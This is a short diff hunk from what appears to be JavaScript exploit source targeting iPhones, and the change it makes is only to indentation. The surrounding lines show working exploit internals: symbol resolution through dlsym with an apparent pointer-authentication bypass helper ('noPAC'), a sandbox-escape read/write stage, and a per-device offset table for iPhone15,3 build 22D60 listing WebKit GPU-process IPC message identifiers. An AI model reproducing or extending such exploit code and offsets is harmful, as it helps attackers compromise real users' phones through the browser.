@@ -26,7 +26,7 @@
   offsets.exit = dlsym(libsystem_kernel, '_exit').noPAC();
   sbx0_rw_begin = Date.now();
   sbx0_offsets = {
-"iPhone15,3_22D60": {
+   "iPhone15,3_22D60": {
       GPUConnectionToWebProcess_CreateGraphicsContextGL: 0x29,
       GPUConnectionToWebProcess_CreateRenderingBackend: 0x2b,
       InitializeConnection: 0xbd9,
